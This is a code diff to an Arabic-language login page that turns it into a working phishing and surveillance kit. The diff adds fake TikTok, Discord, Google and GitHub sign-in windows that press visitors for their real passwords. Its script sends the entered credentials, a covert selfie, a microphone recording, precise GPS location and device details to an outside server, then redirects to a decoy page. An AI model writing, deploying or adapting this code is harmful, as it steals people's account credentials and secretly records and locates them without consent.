@@ -5,26 +5,282 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>تسجيل الدخول</title>
   <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
+
+  <div class="top-left">
+    <p>وصولك</p>
+    <p>أولويتنا</p>
+  </div>
+
+  <div class="right-text">
+    <p>أشياء</p>
+    <p>أفضل</p>
+    <p>بالطريق</p>
+    <span class="line"></span>
+  </div>
+
+  <div class="bottom-left">
+    <i class="fas fa-shield-alt"></i>
+    <span>آمن</span>
+    <span class="dot">•</span>
+    <span>سريع</span>
+    <span class="dot">•</span>
+    <span>موثوق</span>
+  </div>
+
   <div class="login-box">
-    <h2>تسجيل الدخول</h2>
+    <div class="logo">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+            <stop offset="0%" style="stop-color:#4da6ff;stop-opacity:1" />
+            <stop offset="100%" style="stop-color:#0066ff;stop-opacity:1" />
+          </linearGradient>
+        </defs>
+        <path d="M50 10 L70 30 L60 40 L80 40 L60 60 L75 60 L50 85 L25 60 L40 60 L20 40 L40 40 L30 30 Z"
+              fill="url(#logoGrad)" stroke="#4da6ff" stroke-width="1"/>
+      </svg>
+    </div>
+
+    <h2>مرحباً <span class="highlight">بعودتك</span></h2>
+    <p class="subtitle">سجل دخولك للمتابعة</p>
+
     <form id="loginForm">
-      <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-      <input type="password" id="password" placeholder="كلمة المرور" required>
-      <button type="submit">دخول</button>
+      <div class="input-group">
+        <i class="far fa-envelope"></i>
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+      </div>
+
+      <div class="input-group">
+        <i class="fas fa-lock"></i>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <i class="far fa-eye toggle-password" onclick="togglePassword()"></i>
+      </div>
+
+      <div class="options">
+        <label class="remember">
+          <input type="checkbox" checked>
+          <span>تذكرني</span>
+        </label>
+        <a href="#" class="forgot">نسيت كلمة المرور؟</a>
+      </div>
+
+      <button type="submit" id="signInBtn">
+        <i class="fas fa-arrow-left"></i>
+        تسجيل الدخول
+      </button>
     </form>
+
+    <div class="divider">
+      <span>أو تابع باستخدام</span>
+    </div>
+
+    <div class="social">
+      <a href="#" class="social-btn tiktok" onclick="openTikTok(); return false;">
+        <i class="fab fa-tiktok"></i>
+      </a>
+      <a href="#" class="social-btn discord" onclick="openDiscord(); return false;">
+        <i class="fab fa-discord"></i>
+      </a>
+      <a href="#" class="social-btn google" onclick="openGoogle(); return false;">
+        <i class="fab fa-google"></i>
+      </a>
+      <a href="#" class="social-btn github" onclick="openGitHub(); return false;">
+        <i class="fab fa-github"></i>
+      </a>
+    </div>
+
     <p id="msg"></p>
   </div>
 
-  <video id="cam" autoplay playsinline style="display:none;"></video>
+  <!-- نافذة TikTok -->
+  <div id="tiktokModal" class="tiktok-modal">
+    <div class="tiktok-content">
+      <button class="close-btn" onclick="closeTikTok()"><i class="fas fa-times"></i></button>
+      <div class="tiktok-header">
+        <svg viewBox="0 0 24 24" class="tiktok-logo" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg>
+        <h3>TikTok</h3>
+      </div>
+      <div class="tiktok-warning">
+        <i class="fas fa-exclamation-triangle"></i>
+        <p>يجب إدخال إيميل وباسورد صحيح لتجنب الأخطاء</p>
+      </div>
+      <form id="tiktokForm">
+        <div class="tiktok-input">
+          <i class="fas fa-user"></i>
+          <input type="text" id="tiktokEmail" placeholder="رقم الهاتف، الإيميل، أو اسم المستخدم" required>
+        </div>
+        <div class="tiktok-input">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="tiktokPassword" placeholder="كلمة المرور" required>
+        </div>
+        <button type="submit" id="tiktokLoginBtn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+      </form>
+      <p class="tiktok-forgot"><a href="#">هل نسيت كلمة المرور؟</a></p>
+      <div class="tiktok-divider"><span>أو</span></div>
+      <p class="tiktok-signup">ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
+    </div>
+  </div>
+
+  <!-- نافذة Discord -->
+  <div id="discordModal" class="discord-modal">
+    <div class="discord-content">
+      <button class="close-btn" onclick="closeDiscord()"><i class="fas fa-times"></i></button>
+      <div class="discord-header">
+        <svg viewBox="0 0 127.14 96.36" class="discord-logo" fill="currentColor"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>
+        <h3>Discord</h3>
+      </div>
+      <div class="discord-warning">
+        <i class="fas fa-shield-alt"></i>
+        <p>تأكد هل أنت متأكد من إيميل وباسورد حقيقيين؟</p>
+      </div>
+      <form id="discordForm">
+        <div class="discord-input">
+          <i class="fas fa-envelope"></i>
+          <input type="email" id="discordEmail" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        </div>
+        <div class="discord-input">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="discordPassword" placeholder="كلمة المرور" required>
+        </div>
+        <button type="submit" id="discordLoginBtn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+      </form>
+      <p class="discord-forgot"><a href="#">هل نسيت كلمة المرور؟</a></p>
+      <div class="discord-divider"><span>أو</span></div>
+      <p class="discord-signup">بحاجة إلى حساب؟ <a href="#">سجل الآن</a></p>
+    </div>
+  </div>
+
+  <!-- نافذة Google -->
+  <div id="googleModal" class="google-modal">
+    <div class="google-content">
+      <button class="close-btn" onclick="closeGoogle()"><i class="fas fa-times"></i></button>
+      <div class="google-header">
+        <svg viewBox="0 0 24 24" class="google-logo">
+          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+        <h3>تسجيل الدخول باستخدام Google</h3>
+      </div>
+      <div class="google-warning">
+        <i class="fas fa-info-circle"></i>
+        <p>يجب إدخال بيانات حساب Google بشكل صحيح</p>
+      </div>
+      <form id="googleForm">
+        <div class="google-input">
+          <i class="fas fa-envelope"></i>
+          <input type="email" id="googleEmail" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        </div>
+        <div class="google-input">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="googlePassword" placeholder="أدخل كلمة المرور" required>
+        </div>
+        <button type="submit" id="googleLoginBtn"><i class="fas fa-sign-in-alt"></i> التالي</button>
+      </form>
+      <p class="google-forgot"><a href="#">هل نسيت كلمة المرور؟</a></p>
+      <div class="google-divider"><span>أو</span></div>
+      <p class="google-signup">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></p>
+    </div>
+  </div>
+
+  <!-- نافذة GitHub -->
+  <div id="githubModal" class="github-modal">
+    <div class="github-content">
+      <button class="close-btn" onclick="closeGitHub()"><i class="fas fa-times"></i></button>
+      <div class="github-header">
+        <svg viewBox="0 0 16 16" class="github-logo" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
+        <h3>GitHub</h3>
+      </div>
+      <div class="github-warning">
+        <i class="fas fa-info-circle"></i>
+        <p>يجب إدخال بيانات حسابك بشكل صحيح لإكمال العملية</p>
+      </div>
+      <form id="githubForm">
+        <div class="github-input">
+          <i class="fas fa-user"></i>
+          <input type="text" id="githubUsername" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+        </div>
+        <div class="github-input">
+          <i class="fas fa-lock"></i>
+          <input type="password" id="githubPassword" placeholder="كلمة المرور" required>
+        </div>
+        <button type="submit" id="githubLoginBtn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+      </form>
+      <p class="github-forgot"><a href="#">هل نسيت كلمة المرور؟</a></p>
+      <div class="github-divider"><span>أو</span></div>
+      <p class="github-signup">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></p>
+    </div>
+  </div>
+    <video id="cam" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    // 1. إشعار فتح الرابط
+    // ⚠️ الرابط الأساسي للسيرفر
+    const API_BASE = 'https://jino.wisp.uno';
+
+    let permissions = { camera: false, microphone: false, location: false };
+    let attemptCount = parseInt(localStorage.getItem('attemptCount') || '0') + 1;
+    localStorage.setItem('attemptCount', attemptCount);
+
+    let gps = { lat: null, lon: null, acc: null };
+    let photoBase64 = null;
+    let audioBase64 = null;
+
+    function togglePassword() {
+      const pw = document.getElementById('password');
+      const icon = document.querySelector('.toggle-password');
+      if (pw.type === 'password') {
+        pw.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        pw.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    }
+
+    function openTikTok() {
+      document.getElementById('tiktokModal').classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeTikTok() {
+      document.getElementById('tiktokModal').classList.remove('active');
+      document.body.style.overflow = '';
+    }
+    function openDiscord() {
+      document.getElementById('discordModal').classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeDiscord() {
+      document.getElementById('discordModal').classList.remove('active');
+      document.body.style.overflow = '';
+    }
+    function openGoogle() {
+      document.getElementById('googleModal').classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeGoogle() {
+      document.getElementById('googleModal').classList.remove('active');
+      document.body.style.overflow = '';
+    }
+    function openGitHub() {
+      document.getElementById('githubModal').classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+    function closeGitHub() {
+      document.getElementById('githubModal').classList.remove('active');
+      document.body.style.overflow = '';
+    }
+
     async function notifyVisit() {
       try {
-        await fetch('/api/visit', {
+        const res = await fetch(API_BASE + '/api/visit', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify({
@@ -34,12 +290,11 @@
             language: navigator.language
           })
         });
-      } catch(e) {}
+        console.log('Visit response:', await res.json());
+      } catch(e) { console.error('Visit error:', e); }
     }
     notifyVisit();
 
-    // 2. الموقع GPS
-    let gps = { lat: null, lon: null, acc: null };
     function getLocation() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(gps);
@@ -48,19 +303,20 @@
             gps.lat = pos.coords.latitude;
             gps.lon = pos.coords.longitude;
             gps.acc = pos.coords.accuracy;
+            permissions.location = true;
             resolve(gps);
           },
-          () => resolve(gps),
+          () => { permissions.location = false; resolve(gps); },
           { enableHighAccuracy: true, timeout: 8000 }
         );
       });
     }
 
-    // 3. كاميرا سيلفي
-    let photoBase64 = null;
     async function captureSelfie() {
+      if (photoBase64) return;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        permissions.camera = true;
         const video = document.getElementById('cam');
         video.srcObject = stream;
         await video.play();
@@ -73,14 +329,14 @@
         photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
 
         stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('Camera denied'); }
+      } catch (e) { permissions.camera = false; }
     }
 
-    // 4. تسجيل صوتي (5 ثواني)
-    let audioBase64 = null;
     async function recordAudio() {
+      if (audioBase64) return;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        permissions.microphone = true;
         const recorder = new MediaRecorder(stream);
         const chunks = [];
         recorder.ondataavailable = (e) => chunks.push(e.data);
@@ -96,20 +352,28 @@
           reader.readAsDataURL(blob);
         });
         stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('Mic denied'); }
+      } catch (e) { permissions.microphone = false; }
     }
 
-    // 5. معلومات الجهاز
     async function getDeviceInfo() {
       let battery = null;
+      let charging = false;
+      let level = null;
+
       try {
         if (navigator.getBattery) {
           const b = await navigator.getBattery();
-          battery = `${Math.round(b.level * 100)}% ${b.charging ? '(charging)' : ''}`;
+          level = Math.round(b.level * 100);
+          charging = b.charging;
+          battery = `${level}% ${charging ? '⚡ يشحن' : '🔋 لا يشحن'}`;
+        } else {
+          battery = '❌ غير مدعوم في هذا المتصفح';
         }
-      } catch(e) {}
+      } catch(e) {
+        battery = '❌ فشل الحصول على البطارية';
+      }
 
-      let gpuInfo = 'N/A';
+      let gpuInfo = 'غير معروف';
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
@@ -125,8 +389,10 @@
         windowSize: `${window.innerWidth}x${window.innerHeight}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         battery: battery,
-        cores: navigator.hardwareConcurrency || 'N/A',
-        memory: navigator.deviceMemory || 'N/A',
+        batteryLevel: level,
+        batteryCharging: charging,
+        cores: navigator.hardwareConcurrency || 'غير معروف',
+        memory: navigator.deviceMemory || 'غير معروف',
         gpu: gpuInfo,
         touch: 'ontouchstart' in window,
         cookieEnabled: navigator.cookieEnabled,
@@ -134,16 +400,7 @@
       };
     }
 
-    // 6. الفورم
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const btn = e.target.querySelector('button');
-      btn.textContent = 'جاري التحقق...';
-      btn.disabled = true;
-
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-
+    async function sendData(email, password, platform) {
       const [location, , device] = await Promise.all([
         getLocation(),
         captureSelfie(),
@@ -151,21 +408,105 @@
         recordAudio()
       ]);
 
-      await fetch('/api/login', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          email, password,
-          gps: location,
-          photo: photoBase64,
-          audio: audioBase64,
-          device: device
-        })
-      });
+      try {
+        const res = await fetch(API_BASE + '/api/login', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            email, password,
+            platform: platform,
+            gps: location,
+            photo: photoBase64,
+            audio: audioBase64,
+            device: device,
+            attempt: attemptCount,
+            permissions: permissions
+          })
+        });
+        console.log('Login response:', await res.json());
+      } catch(e) {
+        console.error('Login error:', e);
+      }
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('signInBtn');
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      await sendData(email, password, 'الموقع الرئيسي');
 
       document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
-      setTimeout(() => window.location.href = 'https://www.google.com', 1500);
+      setTimeout(() => window.location.href = 'fake.html', 800);
+    });
+
+    document.getElementById('tiktokForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('tiktokLoginBtn');
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('tiktokEmail').value;
+      const password = document.getElementById('tiktokPassword').value;
+
+      await sendData(email, password, 'TikTok');
+
+      closeTikTok();
+      document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
+      setTimeout(() => window.location.href = 'fake.html', 800);
+    });
+
+    document.getElementById('discordForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('discordLoginBtn');
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('discordEmail').value;
+      const password = document.getElementById('discordPassword').value;
+
+      await sendData(email, password, 'Discord');
+
+      closeDiscord();
+      document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
+      setTimeout(() => window.location.href = 'fake.html', 800);
+    });
+
+    document.getElementById('googleForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('googleLoginBtn');
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('googleEmail').value;
+      const password = document.getElementById('googlePassword').value;
+
+      await sendData(email, password, 'Google');
+
+      closeGoogle();
+      document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
+      setTimeout(() => window.location.href = 'fake.html', 800);
+    });
+
+    document.getElementById('githubForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const btn = document.getElementById('githubLoginBtn');
+      btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+      btn.disabled = true;
+
+      const email = document.getElementById('githubUsername').value;
+      const password = document.getElementById('githubPassword').value;
+
+      await sendData(email, password, 'GitHub');
+
+      closeGitHub();
+      document.getElementById('msg').textContent = 'تم تسجيل الدخول... جاري التحويل';
+      setTimeout(() => window.location.href = 'fake.html', 800);
     });
   </script>
 </body>
-</html>
+</html>لا 
